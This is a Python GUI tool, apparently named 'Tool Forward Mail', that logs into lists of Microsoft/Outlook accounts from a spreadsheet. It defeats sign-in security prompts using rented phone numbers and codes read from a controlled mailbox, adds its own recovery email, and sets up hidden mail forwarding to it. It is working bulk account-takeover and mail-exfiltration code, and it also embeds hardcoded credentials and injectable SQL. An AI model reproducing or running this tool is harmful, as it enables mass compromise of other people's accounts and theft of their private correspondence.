from tkinter import *
from tkinter.filedialog import askopenfile
import pandas as pd

import requests
import time
import sqlite3
import imaplib
import email
from requests_html import HTML

from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import wait
from threading import Thread


class MyWindow:
    def __init__(self, win):
        self.pool = None
        self.win = win
        self.emails = []
        self.results = []

        self.main_email = "nhanmailao@minh.live"
        self.main_email_password = "Team123@"
        self.api_key = "3fbef40e"
        self.num_worker = 1
        self.HEADLESS = True

        # config selenium
        self.options = Options()
        self.options.set_preference('intl.accept_languages', 'en-GB')
        self.options.set_preference("permissions.default.image", 2)
        self.options.headless = self.HEADLESS

        self.lbl1 = Label(win, text='File data')
        self.lbl1.place(x=50, y=50)
        self.lbl11 = Label(win, text='')
        self.lbl11.place(x=300, y=50)

        self.lbl2 = Label(win, text='Main mail')
        self.lbl2.place(x=50, y=100)
        self.MAIN_EMAIL = Entry(bd=3, width=30)
        self.MAIN_EMAIL.place(x=200, y=100)

        self.lbl3 = Label(win, text='Password main mail')
        self.lbl3.place(x=50, y=150)
        self.MAIN_EMAIL_PASSWORD = Entry(bd=3, width=30)
        self.MAIN_EMAIL_PASSWORD.place(x=200, y=150)

        self.lbl4 = Label(win, text='Key chothuesim')
        self.lbl4.place(x=50, y=200)
        self.API_KEY = Entry(bd=3, width=30)
        self.API_KEY.place(x=200, y=200)

        self.lbl5 = Label(win, text='Num thread')
        self.lbl5.place(x=50, y=250)
        self.NUM_WORKER = Entry(bd=3, width=30)
        self.NUM_WORKER.place(x=200, y=250)

        self.var = IntVar()
        self.lbl6 = Label(win, text='Headless')
        self.lbl6.place(x=50, y=300)
        self.HEADLESS_TRUE = Radiobutton(win, text="True", variable=self.var, value=True, command=self.sel)
        self.HEADLESS_TRUE.place(x=200, y=300)
        self.HEADLESS_FALSE = Radiobutton(win, text="False", variable=self.var, value=False, command=self.sel)
        self.HEADLESS_FALSE.place(x=350, y=300)


        self.processBtn = Button(win, text='Process', command=self.main, state=DISABLED)
        self.processBtn.place(x=200, y=350)
        self.resultsLabel = Label(win, text='')
        self.resultsLabel.place(x=300, y=350)

        self.b2 = Button(win, text='Open file', command=lambda: self.open_file())
        self.b2.place(x=200, y=50)

        # tao rieng 1 thread de check xem du lieu da duoc dien hay chua
        self.thread_check_fill_data = Thread(target=self.check_input_fill)
        self.thread_check_fill_data.daemon = True
        self.thread_check_fill_data.start()

    def sel(self):
        if self.var.get():
            self.HEADLESS = True
        else:
            self.HEADLESS = False

    def open_file(self):
        file = askopenfile(mode='r', filetypes=[('Python Files', '*.xlsx')])
        if file is not None:

            excel_data = pd.read_excel(file.name, "Data")
            data = pd.DataFrame(excel_data, columns=['email', 'password', 'email_protect'])
            for ind, row in data.iterrows():
                self.emails.append([row['email'], row['password'], row['email_protect']])
            print(excel_data)
            self.lbl11 = Label(self.win, text='Load OK!')
            self.lbl11.place(x=300, y=50)

    def get_phone(self, api_key):
        url = f"https://chothuesimcode.com/api?act=number&apik={api_key}&appId=1017&carrier=Viettel"
        payload = {}
        headers = {}
        response = requests.request("GET", url, headers=headers, data=payload)
        if response.json()["Msg"] == "OK":
            num_phone = response.json()["Result"]["Number"]
            id_phone = response.json()["Result"]["Id"]
            return num_phone, id_phone
        else:
            return -1, -1

    def get_code(self, id_phone, api_key):
        url = f"https://chothuesimcode.com/api?act=code&apik={api_key}&id={id_phone}"
        print(url)
        payload = {}
        headers = {}
        response = requests.request("GET", url, headers=headers, data=payload)
        print("response", response.json())
        if response.json()["Msg"] == "Đã nhận được code":
            return response.json()["Result"]["Code"], response.json()["ResponseCode"]
        elif response.json()["Msg"] == "không nhận được code, quá thời gian chờ":
            return -2, -2
        else:
            return -1, -1

    def login_with_account(self, email_text, password_text):
        browser = webdriver.Firefox(options=self.options)
        browser.get('https://login.live.com')
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "i0116"))).send_keys(email_text)
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "i0118"))).send_keys(password_text)
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
        return browser

    def get_verify_code(self, mail, seen):
        codes = None
        body = ''
        imap_server = imaplib.IMAP4_SSL(host='imap.yandex.com')
        if self.MAIN_EMAIL is not None and self.MAIN_EMAIL_PASSWORD is not None:
            imap_server.login(self.MAIN_EMAIL, self.MAIN_EMAIL_PASSWORD)
        else:
            return
        imap_server.select("INBOX")
        if seen:
            _, message_numbers_raw = imap_server.search(None, f'TO {mail}')
        else:
            _, message_numbers_raw = imap_server.search(None, f'TO {mail} UNSEEN')

        res, msg = imap_server.fetch(message_numbers_raw[0].split()[-1], "(RFC822)")
        for response in msg:
            if isinstance(response, tuple):
                msg = email.message_from_bytes(response[1])

                if msg.is_multipart():
                    for part in msg.walk():

                        try:
                            body = part.get_payload(decode=True).decode()
                        except:
                            body = ''
                else:
                    try:
                        body = msg.get_payload(decode=True).decode()
                    except:
                        body = ''
                try:
                    page = HTML(html=str(body))
                    codes = page.xpath('//tr/td/span//text()')[0]
                except:
                    pass
        imap_server.store(message_numbers_raw[0].split()[-1], "+FLAGS", "\\Seen")
        imap_server.expunge()
        imap_server.close()
        imap_server.logout()
        return codes

    def process_security_email(self, browser, email_protect_text):
        code = ""
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
        WebDriverWait(browser, 100).until(
            EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCS_ProofConfirmation"))).send_keys(email_protect_text)
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCS_SendCode"))).click()
        for i in range(50):
            time.sleep(2)
            try:
                code = self.get_verify_code(mail=email_protect_text, seen=False)
                print("process_security_email:::", code, email_protect_text)
                if code is not None:
                    break
            except:
                pass

        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCC_OTC"))).send_keys(code)
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCC_Continue"))).click()

        for i in range(20):
            time.sleep(2)
            check_loaded_page = self.page_has_loaded(browser)
            if check_loaded_page:
                break
            else:
                pass

        try:
            WebDriverWait(browser, 3).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
        except Exception as e:
            pass
        print("process_security_email done::: ", email_protect_text)
        return browser

    def add_mail_protect(self, browser, email_protect_text):
        code = ""
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "EmailAddress"))).send_keys(
            email_protect_text)
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
        print("MAIL::: ", email_protect_text)
        for i in range(20):
            time.sleep(2)
            try:
                code = self.get_verify_code(mail=email_protect_text, seen=False)
                print("add_mail_protect::: ", code)
                if code is not None and code != -1:
                    break
            except:
                pass

        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
        print("add_mail_protect done ::: ", email_protect_text)
        return browser

    def enter_email_forwarding(self, browser, email_protect_text):
        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
        browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
        time.sleep(3)
        try:
            WebDriverWait(browser, 2).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
        except Exception as e:
            pass

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//*[text()='Enable forwarding']"))).click()

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//*[text()='Keep a copy of forwarded messages']"))).click()

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(
            email_protect_text.split("@")[0])

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("@")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("m")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("n")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("h")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(".")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("l")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("v")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("e")

        try:
            WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
        except Exception as e:
            pass
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Save']"))).click()

        print("SUCCESS add forwarding mail: ", email_protect_text)
        return browser

    def process_code_verify(self, browser, phone_num_id, nums0=0, nums1=0):
        try:
            time.sleep(2)
            phone_code_verify, reponse_code = self.get_code(phone_num_id, self.API_KEY)
            print("nums get phone111: ", nums0, nums1, phone_num_id, reponse_code)
            if reponse_code == 0:
                return phone_code_verify
            if nums1 == 4:
                return None
            if reponse_code == -1:
                if nums0 == 7:
                    try:
                        WebDriverWait(browser, 3).until(
                            EC.element_to_be_clickable((By.XPATH, "//*[text()='I didn’t get a code']"))).click()
                    except:
                        pass
                    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, "//input"))).clear()
                    time.sleep(2)
                    phone_num1, phone_num_id1 = self.get_phone(self.API_KEY)
                    print("rebuy_phone_th1", phone_num1, phone_num_id1)
                    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, "//input"))).send_keys(
                        phone_num1)
                    WebDriverWait(browser, 100).until(
                        EC.element_to_be_clickable((By.XPATH, "//*[text()='Send code']"))).click()
                    return self.process_code_verify(browser, phone_num_id1, 0, nums1 + 1)
                return self.process_code_verify(browser, phone_num_id, nums0 + 1, nums1)

        except Exception as e:
            print("Exception when process_code_verify: ", e)
            return None

    def process_code_verify23(self, browser, phone_num_id, nums0=0, nums1=0):
        try:
            time.sleep(2)
            phone_code_verify, reponse_code = self.get_code(phone_num_id, self.API_KEY)
            print("nums get phone2323: ", nums0, nums1, phone_num_id, reponse_code)

            if reponse_code == 0:
                return phone_code_verify
            if nums1 == 4:
                return None

            if reponse_code == -1:
                if nums0 == 7:
                    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iBtn_close"))).click()
                    WebDriverWait(browser, 100).until(
                        EC.element_to_be_clickable((By.ID, "idAddPhoneAliasLink"))).click()
                    WebDriverWait(browser, 100).until(
                        EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                    phone_num1, phone_num_id1 = self.get_phone(self.API_KEY)
                    print("rebuy_SDT truong hop 2-3: ", phone_num1, phone_num_id1)
                    WebDriverWait(browser, 100).until(
                        EC.element_to_be_clickable((By.ID, "DisplayPhoneNumber"))).send_keys(
                        phone_num1)
                    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()
                    return self.process_code_verify23(browser, phone_num_id1, 0, nums1 + 1)
                return self.process_code_verify23(browser, phone_num_id, nums0 + 1, nums1)
        except Exception as e:
            print("Exception when process_code_verify: ", e)
            return None

    def insert_db(self, mail):
        try:
            with sqlite3.connect("database_mail.db") as con:
                cur = con.cursor()
                cur.execute(f"INSERT INTO mail_tabel_all VALUES ('{mail}') ")
                con.commit()
            print("success --- insert into database: ", mail)
        except:
            print("error --- insert into database: ", mail)

    def check_mail_used(self, mail):
        with sqlite3.connect('database_mail.db') as con:
            cur = con.cursor()
            record = cur.execute(f'''select * from mail_tabel_all where mail = "{mail}" ''')

            if len(record.fetchall()):
                return "Mail used"
            else:
                return "New mail"

    def process(self, account):
        print("-" * 100)
        print(account)

        email_text = account[0]
        password_text = account[1]
        email_protect_text = account[2]

        # check email used
        mail_used = self.check_mail_used(email_text)
        if mail_used == "Mail used":
            status = "forwarded"
            print("forwarded: ", email_text)
        else:

            browser = self.login_with_account(email_text, password_text)
            print("LOGIN SUCCESS")

            # time.sleep(8)
            WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "footer")))
            if "We've detected something unusual about this sign-in. For example, you might be signing in from a new location, device or app." in browser.page_source:
                try:
                    # WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iLandingViewAction"))).click()
                    WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "proofDiv0"))).click()
                except:
                    pass
                self.reactive_mail(browser, email_protect_text)
                status = "re_active mail1"
            elif "For your security and to ensure that only you have access to your account, we will ask you to verify your identity and change your password." in browser.page_source:
                WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iLandingViewAction"))).click()
                try:
                    WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "proofDiv0"))).click()
                    self.reactive_mail2(browser, email_protect_text)
                    status = "change password"
                    password_text = password_text + "!"
                    WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "iPassword"))).send_keys(
                        password_text)
                    WebDriverWait(browser, 100).until(
                        EC.element_to_be_clickable((By.ID, "iPasswordViewAction"))).click()
                    try:
                        WebDriverWait(browser, 100).until(
                            EC.element_to_be_clickable((By.ID, "iReviewProofsViewAction"))).click()
                    except:
                        pass
                except:
                    status = "re_active mail by phone number"

            else:
                try:
                    # gap truong hop 1 chua lam
                    WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "StartAction"))).click()

                    print("gap truong hop 1 chua lam: ", email_text)
                    try:
                        WebDriverWait(browser, 100).until(
                            EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                        phone_num, phone_num_id = self.get_phone(self.API_KEY)
                        print("SDT truong hop 1: ", phone_num, phone_num)
                        WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.XPATH, "//input"))).send_keys(
                            phone_num)
                        WebDriverWait(browser, 100).until(
                            EC.element_to_be_clickable((By.XPATH, "//*[text()='Send code']"))).click()

                        phone_code_verify = self.process_code_verify(browser, phone_num_id, 0, 0)
                        print("phone_code_verify th1: ", phone_code_verify)
                        if phone_code_verify is None:
                            browser.close()
                            self.results.append([email_text, password_text, email_protect_text, "Chua thue dc sdt"])
                            print(f"Chua thue dc sdt_1: {self.results}")
                            return

                        WebDriverWait(browser, 100).until(EC.element_to_be_clickable(
                            (By.XPATH, "//input[@aria-label='Enter the access code']"))).send_keys(phone_code_verify)
                        try:
                            WebDriverWait(browser, 100).until(
                                EC.element_to_be_clickable((By.ID, "ProofAction"))).click()
                        except:
                            browser.close()
                            self.results.append([email_text, password_text, email_protect_text, "Chua thue dc sdt"])
                            return
                        time.sleep(2)

                        try:
                            WebDriverWait(browser, 100).until(
                                EC.element_to_be_clickable((By.ID, "FinishAction"))).click()
                        except Exception as e:
                            pass
                        try:
                            WebDriverWait(browser, 100).until(EC.element_to_be_clickable((By.ID, "idBtn_Back"))).click()
                        except Exception as e:
                            pass

                        time.sleep(2)
                        browser.get("https://outlook.live.com/mail/0/options/mail/layout")
                        try:
                            browser = self.add_mail_protect(browser, email_protect_text)
                        except Exception as e:
                            pass

                        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                        browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                        time.sleep(3)

                        try:
                            WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "footer")))
                            browser = self.process_security_email(browser, email_protect_text)
                        except Exception as e:

                            pass
                        try:
                            WebDriverWait(browser, 1).until(
                                EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
                        except Exception as e:
                            pass
                        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                        browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                        time.sleep(3)
                        try:
                            browser = self.enter_email_forwarding(browser, email_protect_text)

                            status = "success"
                            self.insert_db(email_text)
                            print("Lam xong truong hop 1: ", email_protect_text)
                        except Exception as e:
                            browser.save_full_page_screenshot(f"html/{email_protect_text.split('@')[0]}.png")
                            status = "Error: web can't loaded"
                            print("Truong hop 1 bi loi: ", email_protect_text)
                    except Exception as e:
                        browser.save_full_page_screenshot(f"html/{email_protect_text.split('@')[0]}.png")
                        status = "Error"
                        print("Truong hop 1 bi loi: ", email_protect_text)

                except:
                    try:
                        # gap truong hop 2 hoac 3 chua lam
                        browser.get("https://outlook.live.com/mail/0/options/mail/layout")
                        print("gap truong hop 2 hoac 3 chua lam: ", email_text)
                        try:
                            WebDriverWait(browser, 100).until(
                                EC.element_to_be_clickable((By.XPATH, "//*[text()='Sign in']"))).click()
                            time.sleep(5)
                        except:
                            print("Can't click sign in")
                        # WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                        check_page_loaded = False
                        for i in range(100):
                            time.sleep(1)
                            check_page_loaded = self.page_has_loaded(browser)
                            if check_page_loaded:
                                print("PAGE LOAD COMPLETE")
                                break
                            else:
                                pass
                        if not check_page_loaded:
                            print("PAGE LOAD ERROR")

                        if check_page_loaded:
                            if "Help us protect your account" in browser.page_source:
                                try:
                                    browser = self.add_mail_protect(browser, email_protect_text)
                                    time.sleep(3)

                                    print("cccccccccc: ", email_protect_text)
                                    browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")

                                    browser = self.process_security_email(browser, email_protect_text)
                                    time.sleep(3)
                                    print("Hoan thanh add email protect ", email_protect_text)
                                except:
                                    print("Chua hoan thanh add_mail_protect: ", email_protect_text)

                                    pass

                            else:
                                print("Nhap mail bao ve: ", email_protect_text)
                                browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                                time.sleep(3)
                                WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "footer")))
                                try:
                                    browser = self.process_security_email(browser, email_protect_text)
                                    print("Hoan thanh process_security_email: ", email_protect_text)
                                except Exception as e:
                                    print(
                                        "Chua hoan thanh process_security_email: ",
                                        email_protect_text)
                                    pass

                        # them process_security_email vao day
                        browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                        time.sleep(3)

                        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                        browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                        time.sleep(3)

                        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "lpv")))
                        if "Unable to load these settings. Please try again later" in browser.page_source:
                            print("Chua thue dc sdt: ", email_text)

                            browser.get(
                                "https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                            for i in range(10):
                                try:
                                    WebDriverWait(browser, 30).until(
                                        EC.element_to_be_clickable((By.ID, "idAddPhoneAliasLink"))).click()
                                    break
                                except:
                                    browser.get(
                                        "https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                            WebDriverWait(browser, 100).until(
                                EC.element_to_be_clickable((By.XPATH, "//select/option[@value='VN']"))).click()
                            phone_num_th23, phone_num_id_th23 = self.get_phone(self.API_KEY)
                            print("SDT truong hop 2-3: ", phone_num_th23, phone_num_id_th23)
                            WebDriverWait(browser, 100).until(
                                EC.element_to_be_clickable((By.ID, "DisplayPhoneNumber"))).send_keys(
                                phone_num_th23)  # nhap sdt
                            WebDriverWait(browser, 100).until(
                                EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()
                            phone_code_verify23 = self.process_code_verify23(browser, phone_num_id_th23, 0, 0)
                            print("phone_code_verify th 2-3: ", phone_code_verify23)
                            if phone_code_verify23 is None:
                                browser.close()
                                self.results.append([email_text, password_text, email_protect_text, "Chua thue dc sdt"])
                                print(f"Chua thue dc sdt_23: {self.results}")
                                return

                            WebDriverWait(browser, 100).until(
                                EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(
                                phone_code_verify23)  # nhap code
                            WebDriverWait(browser, 100).until(
                                EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()

                            time.sleep(2)

                        else:
                            print("Da thue duoc so dien thoai", email_text)

                        browser.close()
                        browser = self.login_with_account(email_text, password_text)
                        time.sleep(2)
                        browser.get("https://outlook.live.com/mail/0/options/mail/layout")
                        WebDriverWait(browser, 60).until(
                            EC.element_to_be_clickable((By.XPATH, "//*[text()='Sign in']"))).click()
                        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                        browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                        time.sleep(3)
                        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "footer")))
                        browser = self.process_security_email(browser, email_protect_text)
                        WebDriverWait(browser, 100).until(EC.presence_of_element_located((By.ID, "app")))
                        browser.get("https://outlook.live.com/mail/0/options/mail/forwarding")
                        time.sleep(3)

                        try:
                            browser = self.enter_email_forwarding(browser, email_protect_text)
                            status = "success"
                            self.insert_db(email_text)
                            time.sleep(2)
                        except:
                            browser.save_full_page_screenshot(f"html/{email_protect_text.split('@')[0]}.png")
                            print("Error when add email forwarding", email_text)
                            status = "Error when add email forwarding"

                        try:
                            browser.get(
                                "https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com&refp=profile")
                            # xoa sdt
                            check_page_loaded = False
                            for i in range(100):
                                time.sleep(1)
                                check_page_loaded = self.page_has_loaded(browser)
                                if check_page_loaded:
                                    print("PAGE LOAD COMPLETE1")
                                    break
                                else:
                                    pass
                            if not check_page_loaded:
                                print("PAGE LOAD ERROR1")
                            if check_page_loaded:
                                try:
                                    WebDriverWait(browser, 10).until(
                                        EC.element_to_be_clickable((By.ID, "idRemoveAssocPhone"))).click()
                                    WebDriverWait(browser, 10).until(
                                        EC.element_to_be_clickable((By.ID, "iBtn_action"))).click()
                                except:
                                    pass
                        except:
                            print("Chua hoan thanh xoa sdt 23: ", email_protect_text)

                        # print("Lam xong truong hop 2-3: ", email_protect_text)
                    except Exception as e:
                        browser.save_full_page_screenshot(f"html/{email_protect_text.split('@')[0]}.png")
                        status = "Error"
                        print("Truong hop 2-3 bi loi", email_text)

            browser.close()
        self.results.append([email_text, password_text, email_protect_text, status])
        # print("RESULTS: ", results)

    def page_has_loaded(self, browser):
        page_state = browser.execute_script('return document.readyState;')
        return page_state == 'complete'

    def reactive_mail(self, browser, email_protect_text):
        code = ""
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iProofEmail"))).send_keys(
            email_protect_text.split("@")[0])
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iSelectProofAction"))).click()
        for i in range(50):
            time.sleep(2)
            code = self.get_verify_code(mail=email_protect_text, seen=False)
            print("re_active mail: ", code)
            if code is not None and code != -1:
                break

        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iVerifyCodeAction"))).click()

    def reactive_mail2(self, browser, email_protect_text):
        code = ""
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iProofEmail"))).send_keys(
            email_protect_text.split("@")[0])
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iSelectProofAction"))).click()
        for i in range(50):
            time.sleep(2)
            code = self.get_verify_code(mail=email_protect_text, seen=False)
            print("re_active mail: ", code)
            if code is not None and code != -1:
                break

        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.ID, "iVerifyCodeAction"))).click()

    def check_input_fill(self):
        while True:
            if len(self.MAIN_EMAIL.get()) and len(self.MAIN_EMAIL_PASSWORD.get()) and len(self.API_KEY.get()) and len(
                    self.NUM_WORKER.get()):
                self.processBtn['state'] = NORMAL
            else:
                self.processBtn['state'] = DISABLED

    def main(self):
        print(self.MAIN_EMAIL.get())
        print(self.MAIN_EMAIL_PASSWORD.get())
        print(self.API_KEY.get())
        print(self.NUM_WORKER.get())
        print(self.HEADLESS)

        self.pool = ThreadPoolExecutor(max_workers=int(self.NUM_WORKER.get()))
        if len(self.emails):
            future = [self.pool.submit(self.process, mail) for mail in self.emails]
            wait(future)
            print("All task done.")
            results_df = pd.DataFrame(self.results, columns=["email", "password", "email_protect", "status"])
            results_df.to_excel(f"results_{time.time()}.xlsx")
            self.resultsLabel = Label(self.win, text='DONE!')
            self.resultsLabel.place(x=300, y=300)
        print("DONE!")


window = Tk()
mywin = MyWindow(window)
window.title('Tool Forward Mail')
window.geometry("500x400+10+10")
window.mainloop()
